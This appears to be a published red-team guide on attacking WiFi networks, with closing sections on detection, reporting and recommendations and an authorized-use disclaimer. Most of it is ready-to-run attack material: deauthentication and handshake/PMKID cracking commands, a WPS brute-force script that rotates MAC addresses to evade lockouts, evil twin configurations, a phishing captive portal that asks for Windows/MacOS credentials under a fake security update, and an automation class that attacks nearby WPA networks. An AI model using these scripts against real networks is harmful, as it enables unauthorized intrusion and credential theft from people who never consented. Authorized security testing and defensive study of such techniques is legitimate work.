---
title: 'Red Team WiFi Penetration Testing: Complete Methodology'
description: 'Advanced wireless penetration testing techniques for red team engagements and comprehensive WiFi security assessment'
pubDate: 2025-08-28
category: 'guides'
tags: ['red-team', 'wifi', 'penetration-testing', 'wireless-security']
author: 'MITM.life'
difficulty: 'advanced'
readTime: '25 min'
---

# Red Team WiFi Penetration Testing: Complete Methodology

## Overview

WiFi networks remain a critical attack vector for red team operations, offering multiple entry points into target environments. This comprehensive guide covers advanced wireless penetration testing techniques specifically tailored for red team engagements.

## Prerequisites

### Hardware Requirements

- **WiFi Adapter with Monitor Mode**
  - Alfa AWUS036ACS (802.11ac, dual-band)
  - Pineapple WiFi (for automated attacks)
  - RTL8812AU-based adapters

- **Antennas**
  - High-gain directional antenna (15+ dBi)
  - Omnidirectional antenna for reconnaissance
  - Covert antennas for stealth operations

### Software Stack

```bash
# Essential tools installation (Kali Linux)
sudo apt update && sudo apt install -y \
  aircrack-ng \
  wifite \
  hashcat \
  hcxtools \
  hostapd \
  dnsmasq \
  beef-xss \
  ettercap-text-only
```

## Phase 1: Wireless Reconnaissance

### 1.1 Passive Reconnaissance

```bash
# Enable monitor mode
sudo airmon-ng start wlan0

# Passive scanning for networks
sudo airodump-ng wlan0mon --write survey --output-format csv

# Extended survey with manufacturer detection
sudo airodump-ng wlan0mon --manufacturer --wps --write extended_survey
```

### 1.2 Active Reconnaissance

```bash
# Probe request monitoring
sudo airodump-ng wlan0mon --write probe_requests -f 1000

# Hidden network detection
sudo aireplay-ng -0 1 -a [BSSID] wlan0mon
```

### 1.3 Intelligence Gathering

```python
#!/usr/bin/env python3
"""
WiFi Intelligence Gathering Script
Analyzes captured data for red team insights
"""

import csv
import json
from collections import defaultdict

def analyze_survey_data(csv_file):
    networks = []
    with open(csv_file, 'r') as f:
        reader = csv.DictReader(f)
        for row in reader:
            if row['BSSID']:
                networks.append({
                    'bssid': row['BSSID'],
                    'essid': row['ESSID'],
                    'channel': row['channel'],
                    'privacy': row['Privacy'],
                    'power': int(row['Power']) if row['Power'] else 0,
                    'beacons': int(row['# beacons']) if row['# beacons'] else 0
                })

    # Prioritize targets
    targets = sorted(networks, key=lambda x: x['power'], reverse=True)

    # Identify vulnerable configurations
    vulnerable = [n for n in targets if 'WEP' in n['privacy'] or 'WPS' in n['privacy']]

    return {
        'total_networks': len(networks),
        'high_priority_targets': targets[:10],
        'vulnerable_networks': vulnerable,
        'hidden_networks': [n for n in networks if not n['essid']]
    }

# Usage
if __name__ == "__main__":
    intel = analyze_survey_data('survey-01.csv')
    print(json.dumps(intel, indent=2))
```

## Phase 2: WPA/WPA2 Attacks

### 2.1 Handshake Capture

```bash
# Target specific network for handshake capture
sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w handshake wlan0mon

# Deauthentication attack to force handshake
sudo aireplay-ng -0 5 -a [BSSID] -c [CLIENT_MAC] wlan0mon

# Automated handshake capture with timeout
timeout 300 sudo airodump-ng -c [CHANNEL] --bssid [BSSID] -w auto_capture wlan0mon &
sudo aireplay-ng -0 10 -a [BSSID] wlan0mon
```

### 2.2 PMKID Attack (WPA2)

```bash
# Modern PMKID attack (no client required)
sudo hcxdumptool -i wlan0mon -o pmkid_capture.pcapng --enable_status=1

# Convert for hashcat
hcxpcapngtool -o pmkid.22000 -E essidlist pmkid_capture.pcapng

# Hashcat attack
hashcat -m 22000 pmkid.22000 /path/to/wordlist.txt
```

### 2.3 Advanced WPA Attacks

```bash
# WPA Enterprise attack (EAP)
# Create fake AP for credential harvesting
hostapd_cli -i wlan0mon \
  interface=wlan0mon \
  driver=nl80211 \
  ssid="Corporate-WiFi" \
  hw_mode=g \
  channel=6 \
  auth_algs=3 \
  ieee8021x=1 \
  eap_server=1 \
  eap_user_file=/etc/hostapd/eap_users
```

## Phase 3: WPS Exploitation

### 3.1 WPS PIN Brute Force

```bash
# Identify WPS-enabled networks
sudo wash -i wlan0mon

# Reaver attack
sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -vv -K 1

# Pixie dust attack (faster)
sudo reaver -i wlan0mon -b [BSSID] -c [CHANNEL] -K 1 -P
```

### 3.2 WPS Rate Limiting Bypass

```python
#!/usr/bin/env python3
"""
WPS Rate Limiting Bypass
Implements MAC rotation to avoid detection
"""

import subprocess
import time
import random

def change_mac():
    """Generate and set random MAC address"""
    mac = "02:00:00:%02x:%02x:%02x" % (
        random.randint(0, 255),
        random.randint(0, 255),
        random.randint(0, 255)
    )

    subprocess.run(['ifconfig', 'wlan0mon', 'down'])
    subprocess.run(['ifconfig', 'wlan0mon', 'hw', 'ether', mac])
    subprocess.run(['ifconfig', 'wlan0mon', 'up'])
    return mac

def wps_attack_with_rotation(bssid, channel):
    """WPS attack with MAC rotation"""
    attempt = 0

    while attempt < 1000:  # PIN space is ~11,000
        new_mac = change_mac()
        print(f"Attempt {attempt}: Using MAC {new_mac}")

        # Try 10 PINs before rotating
        cmd = f"timeout 60 reaver -i wlan0mon -b {bssid} -c {channel} -vv -r 10:10"
        result = subprocess.run(cmd.split(), capture_output=True, text=True)

        if "WPS PIN found" in result.stdout:
            print("SUCCESS!")
            break

        attempt += 10
        time.sleep(30)  # Cool down period

# Usage
if __name__ == "__main__":
    wps_attack_with_rotation("AA:BB:CC:DD:EE:FF", "6")
```

## Phase 4: Evil Twin Attacks

### 4.1 Credential Harvesting Portal

```bash
# Set up evil twin AP
sudo hostapd evil_twin.conf &
sudo dnsmasq -C evil_twin_dns.conf &

# Captive portal setup
sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j DNAT --to-destination 192.168.1.1:80
sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j DNAT --to-destination 192.168.1.1:443
```

**evil_twin.conf:**

```
interface=wlan1
driver=nl80211
ssid=Corporate-WiFi
hw_mode=g
channel=6
macaddr_acl=0
auth_algs=1
ignore_broadcast_ssid=0
wpa=2
wpa_passphrase=TempPassword123
wpa_key_mgmt=WPA-PSK
wpa_pairwise=TKIP
rsn_pairwise=CCMP
```

### 4.2 Advanced Social Engineering Portal

```html
<!DOCTYPE html>
<html>
  <head>
    <title>WiFi Access - Security Update Required</title>
    <style>
      body {
        font-family: Arial, sans-serif;
        margin: 50px;
      }
      .container {
        max-width: 400px;
        margin: auto;
      }
      .warning {
        color: #d93025;
        font-weight: bold;
      }
      input[type='password'] {
        width: 100%;
        padding: 10px;
        margin: 10px 0;
      }
      button {
        width: 100%;
        padding: 10px;
        background: #1a73e8;
        color: white;
        border: none;
      }
    </style>
  </head>
  <body>
    <div class="container">
      <h2>Security Update Required</h2>
      <p class="warning">
        ⚠️ Your device requires a security update to access this network.
      </p>
      <p>
        Please enter your Windows/MacOS credentials to download the required
        security patch:
      </p>

      <form action="/submit" method="post">
        <label>Username:</label>
        <input type="text" name="username" required />

        <label>Password:</label>
        <input type="password" name="password" required />

        <button type="submit">Download Security Update</button>
      </form>

      <p><small>This process is required by IT security policy.</small></p>
    </div>
  </body>
</html>
```

## Phase 5: Advanced Attack Techniques

### 5.1 Karma Attack

```bash
# Create fake AP responding to probe requests
sudo airbase-ng -c 6 -e "" -P -C 30 wlan0mon

# Enhanced karma with multiple SSIDs
sudo mdk3 wlan0mon b -f ssid_list.txt -s 100
```

### 5.2 WiFi Pineapple Automation

```bash
# Pineapple module for automated reconnaissance
#!/bin/bash

# Recon module
function wifi_recon() {
    echo "[+] Starting WiFi reconnaissance..."

    # Passive scan
    airodump-ng wlan1mon --write recon_$(date +%Y%m%d_%H%M%S) --output-format csv &
    RECON_PID=$!

    sleep 300  # 5 minute scan
    kill $RECON_PID

    # Parse results
    python3 /root/analyze_survey.py recon_*.csv
}

# Evil twin deployment
function deploy_evil_twin() {
    local target_ssid=$1
    echo "[+] Deploying evil twin for: $target_ssid"

    # Configure hostapd
    cat > /tmp/evil_twin.conf <<EOF
interface=wlan1
ssid=$target_ssid
channel=6
hw_mode=g
EOF

    hostapd /tmp/evil_twin.conf &

    # Start credential harvesting
    python3 /root/credential_harvester.py &
}

# Main execution
wifi_recon
deploy_evil_twin "TARGET_NETWORK"
```

### 5.3 WPA3 Attacks

```bash
# WPA3 SAE (Simultaneous Authentication of Equals) attacks
# Dragonblood attack implementation

# SAE password brute force
sudo wpa_supplicant -i wlan0mon -c sae_attack.conf -D nl80211

# Side-channel timing attacks
python3 dragonblood_timing.py -i wlan0mon -t [TARGET_BSSID]
```

## Phase 6: Post-Exploitation

### 6.1 Network Pivoting

```bash
# Set up routing for internal network access
sudo iptables -A FORWARD -i wlan0 -o eth0 -j ACCEPT
sudo iptables -A FORWARD -i eth0 -o wlan0 -m state --state RELATED,ESTABLISHED -j ACCEPT
sudo iptables -t nat -A POSTROUTING -o eth0 -j MASQUERADE

# Enable IP forwarding
echo 1 | sudo tee /proc/sys/net/ipv4/ip_forward
```

### 6.2 Internal Network Discovery

```python
#!/usr/bin/env python3
"""
Internal Network Discovery Post WiFi Compromise
"""

import nmap
import subprocess
import json

def discover_internal_network():
    """Discover internal network topology"""

    # Get network information
    result = subprocess.run(['ip', 'route'], capture_output=True, text=True)
    networks = []

    for line in result.stdout.split('\n'):
        if 'dev' in line and '/' in line:
            network = line.split()[0]
            if not network.startswith('127'):
                networks.append(network)

    # Scan discovered networks
    nm = nmap.PortScanner()
    hosts = {}

    for network in networks:
        print(f"[+] Scanning {network}")
        nm.scan(network, arguments='-sn')

        for host in nm.all_hosts():
            hosts[host] = {
                'hostname': nm[host].hostname(),
                'state': nm[host].state(),
                'mac': nm[host]['addresses'].get('mac', 'Unknown')
            }

    return hosts

def identify_high_value_targets(hosts):
    """Identify high-value targets from discovered hosts"""

    hvt = []
    nm = nmap.PortScanner()

    for host in hosts:
        print(f"[+] Scanning services on {host}")
        nm.scan(host, '22,23,80,135,139,443,445,3389,5985,5986')

        interesting_ports = []
        if host in nm.all_hosts():
            for port in nm[host]['tcp']:
                service = nm[host]['tcp'][port]['name']
                state = nm[host]['tcp'][port]['state']

                if state == 'open':
                    interesting_ports.append(f"{port}/{service}")

        if interesting_ports:
            hvt.append({
                'host': host,
                'hostname': hosts[host]['hostname'],
                'services': interesting_ports,
                'priority': calculate_priority(interesting_ports)
            })

    return sorted(hvt, key=lambda x: x['priority'], reverse=True)

def calculate_priority(services):
    """Calculate target priority based on services"""
    priority_map = {
        'ssh': 3,
        'http': 2,
        'https': 2,
        'rdp': 5,
        'smb': 4,
        'winrm': 4,
        'telnet': 3
    }

    total = 0
    for service in services:
        service_name = service.split('/')[1].lower()
        total += priority_map.get(service_name, 1)

    return total

# Usage
if __name__ == "__main__":
    print("[+] Starting internal network discovery...")
    hosts = discover_internal_network()
    hvt = identify_high_value_targets(hosts)

    print("\n[+] High-Value Targets:")
    for target in hvt:
        print(f"  {target['host']} ({target['hostname']}) - Priority: {target['priority']}")
        print(f"    Services: {', '.join(target['services'])}")
```

## Defensive Considerations

### Detection Indicators

- Multiple deauthentication frames
- Unusual probe requests patterns
- New APs with familiar SSIDs
- High volume of authentication attempts
- Unexpected MAC address changes

### Countermeasures Assessment

```bash
# Test wireless defenses
# 802.11w (Management Frame Protection) testing
sudo aireplay-ng -0 5 -a [BSSID] wlan0mon  # Should fail with MFP

# WPS lockout testing
sudo reaver -i wlan0mon -b [BSSID] -L  # Check lockout status

# Rate limiting assessment
python3 test_rate_limiting.py [BSSID]
```

## Automation Framework

```python
#!/usr/bin/env python3
"""
Red Team WiFi Automation Framework
Comprehensive WiFi attack automation
"""

import subprocess
import time
import json
import logging
from pathlib import Path

class WiFiRedTeam:
    def __init__(self, interface="wlan0mon"):
        self.interface = interface
        self.results = {}
        self.setup_logging()

    def setup_logging(self):
        logging.basicConfig(
            level=logging.INFO,
            format='%(asctime)s - %(levelname)s - %(message)s',
            handlers=[
                logging.FileHandler('wifi_redteam.log'),
                logging.StreamHandler()
            ]
        )
        self.logger = logging.getLogger(__name__)

    def enable_monitor_mode(self):
        """Enable monitor mode on wireless interface"""
        try:
            subprocess.run(['airmon-ng', 'start', self.interface.replace('mon', '')])
            self.logger.info(f"Monitor mode enabled on {self.interface}")
            return True
        except Exception as e:
            self.logger.error(f"Failed to enable monitor mode: {e}")
            return False

    def reconnaissance(self, duration=300):
        """Perform wireless reconnaissance"""
        self.logger.info("Starting wireless reconnaissance...")

        output_file = f"recon_{int(time.time())}"
        cmd = [
            'timeout', str(duration),
            'airodump-ng', self.interface,
            '--write', output_file,
            '--output-format', 'csv'
        ]

        subprocess.run(cmd)

        # Parse results
        csv_file = f"{output_file}-01.csv"
        if Path(csv_file).exists():
            self.results['reconnaissance'] = self.parse_airodump_csv(csv_file)
            return True

        return False

    def parse_airodump_csv(self, csv_file):
        """Parse airodump CSV results"""
        import csv

        networks = []
        with open(csv_file, 'r') as f:
            reader = csv.DictReader(f)
            for row in reader:
                if row.get('BSSID'):
                    networks.append({
                        'bssid': row['BSSID'],
                        'essid': row.get('ESSID', ''),
                        'channel': row.get('channel', ''),
                        'privacy': row.get('Privacy', ''),
                        'power': int(row['Power']) if row.get('Power') else 0
                    })

        return networks

    def attack_wpa_handshake(self, target):
        """Attack WPA/WPA2 networks for handshake capture"""
        bssid = target['bssid']
        channel = target['channel']

        self.logger.info(f"Attacking {bssid} on channel {channel}")

        # Start capture
        output_file = f"handshake_{bssid.replace(':', '')}"
        capture_cmd = [
            'airodump-ng', '-c', channel,
            '--bssid', bssid, '-w', output_file,
            self.interface
        ]

        capture_proc = subprocess.Popen(capture_cmd)
        time.sleep(5)

        # Deauth attack
        deauth_cmd = [
            'aireplay-ng', '-0', '10',
            '-a', bssid, self.interface
        ]

        subprocess.run(deauth_cmd)
        time.sleep(10)

        capture_proc.terminate()

        # Check if handshake captured
        cap_file = f"{output_file}-01.cap"
        if Path(cap_file).exists():
            check_cmd = ['aircrack-ng', cap_file]
            result = subprocess.run(check_cmd, capture_output=True, text=True)

            if 'handshake' in result.stdout.lower():
                self.logger.info(f"Handshake captured for {bssid}")
                return cap_file

        return None

    def run_automated_attack(self):
        """Run automated WiFi attack sequence"""
        if not self.enable_monitor_mode():
            return False

        # Reconnaissance phase
        if not self.reconnaissance():
            self.logger.error("Reconnaissance failed")
            return False

        networks = self.results['reconnaissance']
        wpa_networks = [n for n in networks if 'WPA' in n['privacy']]

        # Sort by signal strength
        wpa_networks.sort(key=lambda x: x['power'], reverse=True)

        # Attack top targets
        for network in wpa_networks[:5]:
            self.logger.info(f"Targeting {network['essid']} ({network['bssid']})")
            handshake_file = self.attack_wpa_handshake(network)

            if handshake_file:
                self.results[network['bssid']] = {
                    'handshake_file': handshake_file,
                    'status': 'captured'
                }

        # Save results
        with open('wifi_redteam_results.json', 'w') as f:
            json.dump(self.results, f, indent=2)

        return True

# Usage
if __name__ == "__main__":
    redteam = WiFiRedTeam()
    redteam.run_automated_attack()
```

## Reporting Template

### Executive Summary

- Networks identified: [X]
- Vulnerable networks: [X]
- Successful compromises: [X]
- Time to compromise: [X minutes/hours]

### Technical Findings

1. **WEP Networks**: [List with signal strength]
2. **WPS Enabled**: [List with PIN status]
3. **Weak Passwords**: [Handshakes cracked]
4. **Evil Twin Susceptible**: [Networks without 802.11w]

### Risk Assessment

- **Critical**: Immediate network access possible
- **High**: Credentials harvested through social engineering
- **Medium**: Time-intensive brute force attacks feasible
- **Low**: Strong security configurations observed

### Recommendations

1. Disable WPS on all access points
2. Implement WPA3 where possible
3. Enable 802.11w Management Frame Protection
4. Deploy wireless intrusion detection systems
5. Regular security awareness training for users

---

_This guide is intended for authorized red team operations and security testing only. Unauthorized access to wireless networks is illegal._
